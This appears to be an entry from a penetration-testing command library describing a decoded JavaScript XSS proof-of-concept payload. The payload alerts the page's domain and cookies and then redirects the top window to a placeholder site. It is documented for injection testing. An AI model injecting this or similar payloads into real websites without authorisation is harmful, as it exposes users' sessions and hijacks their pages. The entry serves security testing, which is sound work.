---
id: cmd-decoded-xss
data: >-
  alert('XSS POC');alert('Domain: '+document.domain);alert('Your
  Cookies:\n'+document.cookie);top.location.href='http://example.com';
tags:
  - payload
  - js
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:20.766Z'
verified: false
validated: true
submitted: true
---
# decoded-xss-js

## Command

```javascript
alert('XSS POC');alert('Domain: '+document.domain);alert('Your Cookies:\n'+document.cookie);top.location.href='http://example.com';
```

## Description

Decoded JS payload for XSS: alerts POC, domain, cookies, then redirects.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| document.domain | Current domain | No |
| document.cookie | Session cookies | No |

## Examples

### Basic Usage

Execute in browser console or via injection.

## Expected Output

Three alerts, then page redirect.

## Related

- [[commands/base64-xss-payload]]
